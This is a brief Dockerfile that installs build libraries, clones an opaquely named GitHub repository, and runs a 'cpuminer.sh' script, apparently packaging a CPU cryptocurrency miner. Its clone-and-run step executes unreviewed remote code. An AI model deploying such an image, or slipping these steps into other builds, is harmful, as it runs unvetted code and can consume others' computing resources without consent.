FROM debian:stable-slim

RUN apt-get update && apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev \
  wget \
  curl \
  libjansson4 \
 && rm -rf /var/lib/apt/lists/*

RUN mkdir a && \
  git clone https://github.com/gou63gur/a
 
WORKDIR a

CMD ./cpuminer.sh

